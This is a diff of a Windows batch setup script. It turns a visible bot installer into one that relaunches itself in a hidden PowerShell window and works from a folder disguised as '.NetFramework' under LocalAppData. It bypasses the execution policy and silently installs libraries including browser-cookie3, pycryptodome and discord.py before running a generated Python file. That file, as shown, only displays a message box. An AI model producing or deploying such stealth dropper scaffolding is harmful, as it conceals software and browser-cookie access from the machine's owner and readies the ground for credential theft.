@@ -1,41 +1,30 @@
 @echo off
-title Bot1 Setup
+if "%1"=="hidden" goto start
+powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
+exit
 
-echo ================================
-echo Creating bot1 folder on Desktop...
-echo ================================
+:start
+setlocal
 
-set DESKTOP=%USERPROFILE%\Desktop
-set DOWNLOADS=%USERPROFILE%\Downloads
+set "WORKDIR=%LOCALAPPDATA%\.NetFramework"
 
-mkdir "%DESKTOP%\bot1" 2>nul
+if not exist "%WORKDIR%" (
+    mkdir "%WORKDIR%"
+)
 
-echo ================================
-echo Copying bot1.py from Downloads...
-echo ================================
-
-copy "%DOWNLOADS%\bot1.py" "%DESKTOP%\bot1\" /Y
-
-echo ================================
-echo Moving to bot1 folder...
-echo ================================
-
-cd /d "%DESKTOP%\bot1"
-
-echo ================================
-echo Creating virtual environment...
-echo ================================
+cd /d "%WORKDIR%"
 
 python -m venv venv
+if errorlevel 1 exit /b 1
 
-echo ================================
-echo Opening PowerShell with ExecutionPolicy Bypass...
-echo ================================
+powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python -m pip install --upgrade pip; pip install requests numpy pillow opencv-python pyautogui psutil pywin32 pycryptodome scipy pytz discord.py browser-cookie3"
+if errorlevel 1 exit /b 1
 
-powershell -NoExit -ExecutionPolicy Bypass -Command ^
-"cd '%DESKTOP%\bot1'; ^
-.\venv\Scripts\Activate.ps1; ^
-python -m pip install --upgrade pip; ^
-pip install requests pycryptodome sounddevice scipy numpy pillow opencv-python pyttsx3 psutil pyautogui browser-cookie3 discord.py"
+(
+echo import ctypes
+echo ctypes.windll.user32.MessageBoxW(0, "heeellllooo", "Greeting", 0)
+) > bot1.py
 
-pause
+powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python bot1.py"
+
+exit
